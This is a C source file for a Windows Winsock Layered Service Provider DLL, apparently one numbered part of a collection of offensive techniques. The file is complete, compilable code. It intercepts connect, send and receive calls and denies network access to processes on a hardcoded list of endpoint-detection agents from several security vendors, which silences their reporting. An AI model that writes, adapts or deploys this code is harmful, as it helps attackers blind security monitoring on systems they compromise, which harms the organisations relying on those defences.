/*
 * 18_winsock_lsp_dll.c
 * Winsock LSP DLL — the actual intercept DLL installed by 18_winsock_lsp_install.exe
 *
 * Must be compiled as a DLL:
 *   cl /LD 18_winsock_lsp_dll.c /link ws2_32.lib /OUT:18_winsock_lsp_dll.dll
 *
 * This DLL:
 *   1. Exports WSPStartup() — the mandatory Winsock SPI entry point
 *   2. Provides a minimal WSP procedure table covering WSPConnect, WSPSend, WSPRecv
 *   3. In WSPConnect: checks if the calling process is an EDR name
 *      If yes: return WSAEACCES (connection refused)
 *      If no:  forward to next provider in chain
 *
 * All other WSP functions forward to the next provider.
 *
 * Architecture:
 *   Process calls connect()
 *     → ws2_32.dll dispatches to WSPConnect in our DLL
 *       → if EDR: return WSAEACCES
 *       → else: call g_NextProcTable.lpWSPConnect (next provider/tcpip.sys)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2spi.h>
#include <stdio.h>
#include <wchar.h>
#include <ctype.h>   /* tolower */

/* Next provider's procedure table (filled in WSPStartup) */
static WSPPROC_TABLE g_NextProcTable = {0};

/* EDR process names to block (lowercase comparison) */
static const char *EDR_PROCESS_NAMES[] = {
    "mssense.exe",
    "msmpeng.exe",
    "sensecncproxy.exe",
    "csfalconservice.exe",
    "csagent.exe",
    "elastic-agent.exe",
    "sentinelagent.exe",
    "xagt.exe",
    "cb.exe",
    NULL
};

/* Get the current process name (lowercase) */
static void GetProcessNameLower(char *out, DWORD outLen)
{
    char path[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char *name = strrchr(path, '\\');
    name = name ? (name + 1) : path;
    strncpy_s(out, outLen, name, _TRUNCATE);
    /* Convert to lowercase */
    for (char *p = out; *p; p++) *p = (char)tolower((unsigned char)*p);
}

/* Returns TRUE if current process is an EDR */
static BOOL IsEdrProcess(void)
{
    char procName[MAX_PATH] = {0};
    GetProcessNameLower(procName, sizeof(procName));

    for (int i = 0; EDR_PROCESS_NAMES[i] != NULL; i++) {
        if (strcmp(procName, EDR_PROCESS_NAMES[i]) == 0)
            return TRUE;
    }
    return FALSE;
}

/* ---- WSP Function Intercepts ---- */

static int WSPAPI LSP_WSPConnect(
    SOCKET s,
    const struct sockaddr *name,
    int namelen,
    LPWSABUF lpCallerData,
    LPWSABUF lpCalleeData,
    LPQOS lpSQOS,
    LPQOS lpGQOS,
    LPINT lpErrno)
{
    if (IsEdrProcess()) {
        *lpErrno = WSAEACCES;
        return SOCKET_ERROR;
    }
    return g_NextProcTable.lpWSPConnect(
        s, name, namelen, lpCallerData, lpCalleeData,
        lpSQOS, lpGQOS, lpErrno);
}

static int WSPAPI LSP_WSPSend(
    SOCKET s,
    LPWSABUF lpBuffers,
    DWORD dwBufferCount,
    LPDWORD lpNumberOfBytesSent,
    DWORD dwFlags,
    LPWSAOVERLAPPED lpOverlapped,
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine,
    LPWSATHREADID lpThreadId,
    LPINT lpErrno)
{
    if (IsEdrProcess()) {
        *lpErrno = WSAENOTCONN;
        return SOCKET_ERROR;
    }
    return g_NextProcTable.lpWSPSend(
        s, lpBuffers, dwBufferCount, lpNumberOfBytesSent,
        dwFlags, lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);
}

static int WSPAPI LSP_WSPRecv(
    SOCKET s,
    LPWSABUF lpBuffers,
    DWORD dwBufferCount,
    LPDWORD lpNumberOfBytesRecvd,
    LPDWORD lpFlags,
    LPWSAOVERLAPPED lpOverlapped,
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine,
    LPWSATHREADID lpThreadId,
    LPINT lpErrno)
{
    if (IsEdrProcess()) {
        *lpErrno = WSAENOTCONN;
        return SOCKET_ERROR;
    }
    return g_NextProcTable.lpWSPRecv(
        s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd,
        lpFlags, lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);
}

/*
 * Macro to generate pass-through forwarding stubs for WSP functions
 * we don't need to intercept. This avoids dozens of near-identical functions.
 */
#define PASSTHROUGH_STUB(name)  (g_NextProcTable.lp##name)

/* ---- WSPStartup — mandatory DLL entry point for LSPs ---- */

__declspec(dllexport)
int WSPAPI WSPStartup(
    WORD wVersionRequested,
    LPWSPDATA lpWSPData,
    LPWSAPROTOCOL_INFOW lpProtocolInfo,
    WSPUPCALLTABLE UpcallTable,
    LPWSPPROC_TABLE lpProcTable)
{
    UNREFERENCED_PARAMETER(UpcallTable);

    /* Load the next provider in the chain */
    WCHAR  nextDllPath[MAX_PATH] = {0};
    DWORD  nextDllPathLen        = MAX_PATH;
    INT    error                 = 0;

    /* WSCGetProviderPath gets the DLL for the next provider in the chain */
    if (WSCGetProviderPath(&lpProtocolInfo->ProviderId,
                            nextDllPath, (LPINT)&nextDllPathLen, &error) != 0)
    {
        return WSAEPROVIDERFAILEDINIT;
    }

    /* Expand the path (may contain REG_EXPAND_SZ %SystemRoot% style vars) */
    WCHAR expandedPath[MAX_PATH] = {0};
    ExpandEnvironmentStringsW(nextDllPath, expandedPath, MAX_PATH);

    /* Load the next provider's DLL and get its WSPStartup */
    HMODULE hNextDll = LoadLibraryW(expandedPath);
    if (!hNextDll) return WSAEPROVIDERFAILEDINIT;

    typedef int (WSPAPI *PFN_WSPStartup)(WORD, LPWSPDATA, LPWSAPROTOCOL_INFOW,
                                          WSPUPCALLTABLE, LPWSPPROC_TABLE);
    PFN_WSPStartup pfnNext = (PFN_WSPStartup)GetProcAddress(hNextDll, "WSPStartup");
    if (!pfnNext) return WSAEPROVIDERFAILEDINIT;

    /* Initialize next provider */
    int ret = pfnNext(wVersionRequested, lpWSPData, lpProtocolInfo,
                      UpcallTable, &g_NextProcTable);
    if (ret != 0) return ret;

    /* Override the functions we intercept; everything else passes through */
    *lpProcTable = g_NextProcTable;
    lpProcTable->lpWSPConnect = LSP_WSPConnect;
    lpProcTable->lpWSPSend    = LSP_WSPSend;
    lpProcTable->lpWSPRecv    = LSP_WSPRecv;

    return 0;
}

/* ---- DLL main ---- */

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID lpvReserved)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);
    UNREFERENCED_PARAMETER(reason);
    return TRUE;
}
